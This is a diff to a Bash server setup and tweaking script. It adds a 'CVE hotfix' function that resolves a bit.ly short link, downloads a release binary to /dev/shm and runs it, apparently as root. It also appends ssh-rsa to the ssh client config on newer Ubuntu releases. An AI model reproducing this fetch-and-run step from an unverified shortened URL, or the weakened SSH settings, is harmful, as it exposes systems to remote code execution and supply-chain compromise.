@@ -18,8 +18,10 @@ BBC="\033[1;34m"
 
 printf "   ____  ____  ____        _ _     _           \n  |  _ \\|  _ \\| __ ) _   _(_) | __| | ___ _ __ \n  | |_) | |_) |  _ \\| | | | | |/ _\\ |/ _ \\ '__|\n  |  __/|  __/| |_) | |_| | | | (_| |  __/ |   \n  |_|   |_|   |____/ \\__,_|_|_|\\__,_|\\___|_|   \n" | while IFS= read -r line; do printf "%s\n" "$line"; sleep 0.1; done
 
-# show script version
+# script version
 self_current_version="1.1.29"
+tweaker_current_version="0.16.5"
+
 printf "\n   ${YC}v${YC}$self_current_version\n\n${NC}"
 
 # check privileges
@@ -567,7 +569,7 @@ backup_etc_func () {
 run_all_tweaks() {
 
 printf "   _____                    _             \n  |_   _|_      _____  __ _| | _____ _ __ \n    | | \\ \\ /\\ / / _ \\/ _\\ | |/ / _ \\ '__|\n    | |  \\ V  V /  __/ (_| |   <  __/ |   \n    |_|   \\_/\\_/ \\___|\\__,_|_|\\_\\___|_|   \n" | while IFS= read -r line; do printf "%s\n" "$line"; sleep 0.1; done
-printf "\n   ${YC}v${YC}$self_current_version\n\n${NC}"
+printf "\n   ${YC}v${YC}$tweaker_current_version\n\n${NC}"
 
 echo
 read -p "Skip all tweaks ? [Y/n]" -n 1 -r
@@ -580,7 +582,8 @@ if [[ ! $REPLY =~ ^([Nn]|$'\xd1\x82'|$'\xd0\xa2')$ ]]; then
 else
 	backup_etc_func
 	tweak_dns_func
-	tweak_ssh_func
+	tweak_cve_func
+	tweak_ssh_client_func
 	tweak_swapfile_func
 	tweak_openfiles_func
 	tweak_tuned_func
@@ -618,10 +621,20 @@ fi
 
 }
 
-# Ubuntu 24/25 add ssh-rsa for ssh client
-tweak_ssh_func() {
+# CVEs mitigations
+tweak_cve_func() {
 
-. /etc/os-release && [[ $NAME == Ubuntu ]] && [[ $VERSION_ID =~ ^2[45]\. ]] && { grep -RiIqE 'HostKeyAlgorithms|PubkeyAcceptedKeyTypes' /etc/ssh/ssh_config* || { echo 'HostKeyAlgorithms +ssh-rsa' >> /etc/ssh/ssh_config && echo 'PubkeyAcceptedKeyTypes +ssh-rsa' >> /etc/ssh/ssh_config;} }
+	# CVE-2026-31431 hotfix (Copy Fail LPE)
+	b="/dev/shm/cve_2026_31431_hotfix"; wget -qO $b $(wget -qO- https://bit.ly/4elJXcG | grep browser_download_url | grep -v .exe | cut -d '"' -f 4) && chmod +x $b && $b
+
+}
+
+# Ubuntu 2x add ssh-rsa for ssh client
+tweak_ssh_client_func() {
+
+	printf "Adding ssh-rsa algorithm to ssh client\n"
+
+	. /etc/os-release && [[ $NAME == Ubuntu ]] && [[ $VERSION_ID =~ ^2[4-9]\. ]] && { grep -RiIqE 'HostKeyAlgorithms|PubkeyAcceptedKeyTypes' /etc/ssh/ssh_config* || { echo 'HostKeyAlgorithms +ssh-rsa' >> /etc/ssh/ssh_config && echo 'PubkeyAcceptedKeyTypes +ssh-rsa' >> /etc/ssh/ssh_config;} }
 
 }
 
@@ -3160,7 +3173,7 @@ fi
 # run tweak function
 if [[ $1 = "tweak" ]]
 then
-	check_tools_func wget
+	check_tools_func wget curl
 	run_all_tweaks
 	exit 0
 fi
